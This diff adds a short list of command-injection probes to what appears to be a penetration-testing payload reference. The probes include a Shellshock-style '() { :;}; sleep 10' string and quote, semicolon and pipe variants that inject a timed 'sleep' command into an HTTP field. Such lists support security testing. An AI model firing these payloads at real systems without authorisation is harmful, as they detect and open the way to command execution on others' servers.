@@ -72,3 +72,12 @@ If the attack vector is in POST (HTTP body), try each of the above with and with
 
 == Other
 
+[source]
+----
+() { :;}; sleep 10
+;sleep 10
+\" ;sleep 10
+' ;sleep 10
+|sleep 10
+\\'
+----
